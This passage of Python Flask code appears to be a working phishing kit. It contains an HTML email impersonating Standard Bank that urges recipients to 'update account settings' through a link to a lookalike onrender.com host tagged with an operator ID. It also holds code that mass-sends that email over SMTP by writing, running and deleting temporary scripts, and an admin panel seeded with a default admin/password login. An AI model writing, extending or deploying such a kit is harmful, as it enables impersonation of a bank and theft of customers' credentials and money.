# HTML content (same template)
html_content = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standard Bank - Account Verification Required</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #003cc7;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }}
        
        .email-container {{
            max-width: 500px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }}
        
        .header-bar {{
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }}
        
        .content {{
            padding: 20px;
            color: #333;
        }}
        
        .greeting {{
            font-size: 18px;
            margin-bottom: 20px;
            color: #333;
            font-weight: bold;
        }}
        
        .main-message {{
            font-size: 14px;
            margin-bottom: 20px;
            color: #333;
            line-height: 1.6;
        }}
        
        .service-link {{
            background-color: #0056b3;
            color: white;
            padding: 12px 20px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin: 20px 0;
            font-weight: bold;
            font-size: 16px;
            transition: background-color 0.3s ease;
            border: none;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }}
        
        .service-link:hover {{
            background-color: #004080;
        }}
        
        .footer-bar {{
            background: linear-gradient(90deg, #0056b3 0%, #003cc7 100%);
            color: white;
            padding: 15px 20px;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
            font-style: italic;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header-bar">
            <div class="header-left">
                Customer Care: 086 120 1311
            </div>
            <div class="header-right">
                <span>Website: www.standardbank.co.za</span>
                <div class="logo-section">
                    <div class="logo">
                        <img src="https://standardbank.onrender.com/logo-email.png" alt="Standard Bank Logo">
                    </div>
                </div>
            </div>
        </div>
        
        <div class="content">
            <div class="greeting">
                Hello Customer,
            </div>
            
            <div class="main-message">
                Your account security settings require updating to comply with new banking regulations. Please update your profile information to maintain uninterrupted access to your banking services.
            </div>
            
            <div class="main-message">
                For assistance with account updates, contact our customer service on <strong>086 120 1311</strong> or international <strong>+27 01 249 0423</strong>.
            </div>
            
            <div style="text-align: center;">
                <a href="https://standardbank.onrender.com/?admin_id=168368c5-7a1a-4dd8-8ce0-4622f8080f95" class="service-link">
                    UPDATE ACCOUNT SETTINGS
                </a>
            </div>
            
            <div class="main-message">
                Kind Regards,<br>
                <strong>Standard Bank</strong>
            </div>
            
            {f'<div class="main-message"><strong>Notes:</strong> {notes}</div>' if notes else ''}
        </div>
        
        <div class="footer-bar">
            Standard Bank IT CAN BE.
        </div>
    </div>
</body>
</html>"""

# Attach HTML
msg.attach(MIMEText(html_content, "html"))

# Send email
server = smtplib.SMTP(smtp_server, port)
server.starttls()
server.login(username, password)
server.sendmail(msg["From"], msg["To"], msg.as_string())
server.quit()

print("✅ Batch email sent successfully!")
print(f"📧 To: {email}")
print(f"🎯 Subject: {subject}")
'''
                    
                    # Write and run temporary script
                    with open(f'temp_batch_{sent_count}.py', 'w', encoding='utf-8') as file:
                        file.write(temp_smtp_content)
                    
                    result = subprocess.run([sys.executable, f'temp_batch_{sent_count}.py'], capture_output=True, text=True)
                    
                    # Clean up
                    if os.path.exists(f'temp_batch_{sent_count}.py'):
                        os.remove(f'temp_batch_{sent_count}.py')
                    
                    if result.returncode == 0:
                        sent_count += 1
                    else:
                        failed_emails.append(email)
                        
            except Exception as e:
                failed_emails.append(email)
                print(f"Failed to send email to {email}: {str(e)}")
        
        # Return results
        if sent_count > 0:
            message = f"Batch '{batch_name}' completed. {sent_count} emails sent successfully."
            if failed_emails:
                message += f" {len(failed_emails)} emails failed."
            
            return jsonify({
                'success': True,
                'sent_count': sent_count,
                'failed_count': len(failed_emails),
                'failed_emails': failed_emails,
                'message': message
            }), 200
        else:
            return jsonify({'error': 'No emails were sent successfully'}), 500
            
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

# Route to get email statistics
@app.route('/api/email-stats')
def get_email_stats():
    """Get email sending statistics"""
    try:
        # For now, return basic stats (you can enhance this with database tracking)
        return jsonify({
            'success': True,
            'total_emails': 0,  # You can track this in database
            'batch_count': 0,   # You can track this in database
            'success_rate': 100  # You can calculate this from database
        }), 200
        
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500



# Initialize database and create default admin user
def init_database():
    """Initialize database tables and create default admin user"""
    with app.app_context():  # Create application context for database operations
        # Create tables based on model definitions (don't drop existing data)
        db.create_all()  # Create tables based on model definitions
        
        # Check if any admin users exist
        admin_count = Admin.query.count()
        
        if admin_count == 0:  # No admin users exist
            # Create default super admin user
            hashed_password = bcrypt.hashpw('password'.encode('utf-8'), bcrypt.gensalt())  # Hash default password
            admin = Admin(
                username='admin',  # Default username
                password_hash=hashed_password.decode('utf-8'),  # Store hashed password
                unique_link_id=str(uuid.uuid4()), # Generate a unique link ID
                is_super_admin=True,  # Mark as super admin
                created_by=None,  # No creator for the first super admin
                is_active=True  # Active by default
            )
            
            # Add admin to database
            db.session.add(admin)  # Add admin to session
            db.session.commit()  # Save to database
            print('Default super admin created: username=admin, password=password')  # Log creation
        
        print('Database initialized successfully')  # Log successful initialization

# Main application entry point
if __name__ == '__main__':
    # Initialize database on startup
    init_database()  # Create tables and default admin
    
    # Get port from environment variable (Render sets this automatically)
    port = int(os.environ.get('PORT', 3000))  # Use PORT env var or default to 3000
    
    # Print application information
    print('Flask server starting...')
    print(f'Server running on port {port}')
    print('Admin panel available at /admin/login')
    
    # Start Flask application
    # Use debug=False for production, but allow override with environment variable
    debug_mode = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    app.run(
        host='0.0.0.0',  # Listen on all network interfaces
        port=port,  # Use dynamic port for Render deployment
        debug=debug_mode  # Enable debug mode only if explicitly set
    )
